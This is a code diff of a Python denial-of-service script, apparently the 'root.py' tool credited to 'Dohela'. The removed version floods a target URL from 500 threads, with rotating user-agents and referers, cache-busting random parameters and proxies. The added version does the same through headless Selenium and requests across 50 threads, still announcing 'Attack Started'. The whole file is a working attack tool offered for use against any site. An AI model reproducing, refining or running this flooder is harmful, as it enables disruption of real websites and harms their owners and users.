@@ -5,21 +5,23 @@
        # Github : https://github.com/dohelax   #
        #########################################
 
-import urllib.request as urllib2
 import sys
 import threading
 import random
-import re
+import requests
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from webdriver_manager.chrome import ChromeDriverManager
+from bs4 import BeautifulSoup
 
 # Global params
 url = ''
-host = ''
-headers_useragents = []
-headers_referers = []
 request_counter = 0
 flag = 0
 safe = 0
-proxies = []
 
 def inc_counter():
     global request_counter
@@ -33,136 +35,110 @@ def set_safe():
     global safe
     safe = 1
 
-def useragent_list():
-    global headers_useragents
-    headers_useragents = [
-        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
-        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
-        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
-        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
-        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
-        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
-        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
-        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
-        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
-        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
-        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
-        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
-    ]
-    return headers_useragents
+# Create a headless browser instance
+def create_driver():
+    options = Options()
+    options.add_argument('--headless')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-gpu')
+    options.add_argument('--disable-extensions')
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+    return driver
 
-def referer_list():
-    global headers_referers
-    headers_referers = [
-        'http://www.google.com/?q=',
-        'http://www.usatoday.com/search/results?q=',
-        'http://engadget.search.aol.com/search?q=',
-        'http://' + host + '/'
-    ]
-    return headers_referers
+def fetch_with_selenium(target_url):
+    driver = create_driver()
+    driver.get(target_url)
+    page_source = driver.page_source
+    driver.quit()
+    return page_source
 
-def buildblock(size):
-    return ''.join(chr(random.randint(65, 90)) for _ in range(size))
+def fetch_with_requests(target_url):
+    session = requests.Session()
+    retry = Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
+    adapter = HTTPAdapter(max_retries=retry)
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
+
+    headers = {
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/90.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'
+        ]),
+        'Cache-Control': 'no-cache',
+        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+        'Referer': 'http://www.google.com/'
+    }
+
+    try:
+        response = session.get(target_url, headers=headers)
+        response.raise_for_status()
+        return response.text
+    except requests.RequestException as e:
+        print(f"Request error: {e}")
+        return None
+
+def httpcall(url):
+    if not url.startswith('http'):
+        url = 'http://' + url
+
+    page_source = fetch_with_selenium(url)
+    if not page_source:
+        page_source = fetch_with_requests(url)
+
+    if page_source:
+        print(f"Fetched content from {url}")
+        inc_counter()
+    else:
+        print(f"Failed to fetch content from {url}")
 
 def usage():
     print('---------------------------------------------------')
     print('USAGE: python root.py <url>')
-    print('you can add "safe" after url, to autoshut after dos')
+    print('You can add "safe" after url, to autoshutdown after dos')
     print('---------------------------------------------------')
 
-def load_proxies():
-    global proxies
-    # Add your proxy list here or load from a file
-    proxies = [
-        'http://proxy1.example.com:8080',
-        'http://proxy2.example.com:8080',
-        # Add more proxies as needed
-    ]
-
-def httpcall(url):
-    useragent_list()
-    referer_list()
-    code = 0
-    param_joiner = "&" if url.count("?") > 0 else "?"
-
-    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
-    request.add_header('User-Agent', random.choice(headers_useragents))
-    request.add_header('Cache-Control', 'no-cache')
-    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
-    request.add_header('Keep-Alive', str(random.randint(110, 120)))
-    request.add_header('Connection', 'keep-alive')
-    request.add_header('Host', host)
-    
-    proxy = random.choice(proxies) if proxies else None
-    if proxy:
-        proxy_support = urllib.request.ProxyHandler({'http': proxy})
-        opener = urllib.request.build_opener(proxy_support)
-        urllib.request.install_opener(opener)
-    
-    try:
-        urllib.request.urlopen(request)
-    except urllib.error.HTTPError:
-        set_flag(1)
-        print('Ataque Iniciado 65000 Bytes By Dohela')
-        code = 500
-    except urllib.error.URLError:
-        sys.exit()
-    else:
-        inc_counter()
-        urllib.request.urlopen(request)
-    return code
-
+# HTTP caller thread
 class HTTPThread(threading.Thread):
     def run(self):
         try:
             while flag < 2:
-                code = httpcall(url)
-                if code == 500 and safe == 1:
+                httpcall(url)
+                if safe == 1 and flag == 1:
                     set_flag(2)
-        except Exception:
-            pass
+        except Exception as ex:
+            print(f"Exception in HTTPThread: {ex}")
 
+# Monitors HTTP threads and counts requests
 class MonitorThread(threading.Thread):
     def run(self):
         previous = request_counter
         while flag == 0:
-            if previous + 100 < request_counter:
+            if (previous + 100 < request_counter) and (previous != request_counter):
                 print(f"{request_counter} Requests Sent")
                 previous = request_counter
         if flag == 2:
-            print("\n-- Root Attack Finished --")
+            print("\n-- Attack Finished --")
 
-if __name__ == "__main__":
-    if len(sys.argv) < 2:
+# Execute
+if len(sys.argv) < 2:
+    usage()
+    sys.exit()
+else:
+    if sys.argv[1] == "help":
         usage()
         sys.exit()
     else:
-        if sys.argv[1] == "help":
-            usage()
-            sys.exit()
-        else:
-            print("-- Root Attack Started By Dohela --")
-            if len(sys.argv) == 3:
-                if sys.argv[2] == "safe":
-                    set_safe()
-            url = sys.argv[1]
-            if url.count("/") == 2:
-                url += "/"
-            
-            m = re.search(r'http://([^/]*)/?.*', url)
-            if m:
-                host = m.group(1)
-            else:
-                print("URL'den ana makine alınamadı. Lütfen URL'yi kontrol edin.")
-                sys.exit()
+        print("-- Attack Started --")
+        if len(sys.argv) == 3 and sys.argv[2] == "safe":
+            set_safe()
+        url = sys.argv[1]
+        if url.count("/") == 2:
+            url = url + "/"
 
-            load_proxies()
-
-            for _ in range(500):
-                t = HTTPThread()
-                t.start()
-            
-            t = MonitorThread()
+        for _ in range(50):  # Adjust thread count as needed
+            t = HTTPThread()
             t.start()
-
+        t = MonitorThread()
+        t.start()
